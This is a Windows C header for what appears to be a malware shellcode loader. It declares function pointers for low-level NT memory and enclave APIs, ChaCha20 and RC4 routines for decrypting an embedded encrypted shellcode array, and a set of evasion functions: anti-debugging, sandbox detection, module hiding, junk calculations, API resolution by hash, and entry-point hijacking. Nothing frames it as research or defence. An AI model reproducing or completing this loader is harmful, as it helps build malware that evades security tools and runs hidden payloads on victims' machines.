#pragma once

#include <windows.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// Enhanced API definitions
typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemoryEx)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection,
    PMEM_EXTENDED_PARAMETER ExtendedParameters,
    ULONG ExtendedParameterCount);

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* _LdrCallEnclave)(
    PENCLAVE_ROUTINE Routine,
    ULONG Flags,
    PVOID* RoutineParamReturn);

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(NTAPI* _RtlGetVersion)(
    PRTL_OSVERSIONINFOW VersionInformation);

// Enhanced encryption functions
BOOL derive_encryption_key_chacha(PBYTE derived_key, DWORD key_size, PBYTE nonce, DWORD nonce_size);
void chacha20_cryptography(PBYTE data, size_t data_len, PBYTE key, size_t key_len, PBYTE nonce);

// Early execution hijacking
extern "C" void hijack_entry_point();
extern "C" void initialize_early_execution();

// Enhanced evasion functions
void execute_junk_calculations();
BOOL is_safe_environment();
void advanced_anti_debug();
BOOL detect_sandbox();
void integrity_checks();
void hide_module(HMODULE hModule);
PVOID find_memory_region(size_t size);
HMODULE load_tprtdll();
void execute_payload();
DWORD compute_custom_hash(const char* str);
PVOID get_function_by_hash(HMODULE module, DWORD hash);

// Original functions for backward compatibility
BOOL derive_encryption_key(PBYTE derived_key, DWORD key_size);
void rc4_cryptography(PBYTE data, size_t data_len, PBYTE key, size_t key_len);

extern unsigned char encrypted_shellcode[];
extern size_t encrypted_shellcode_size;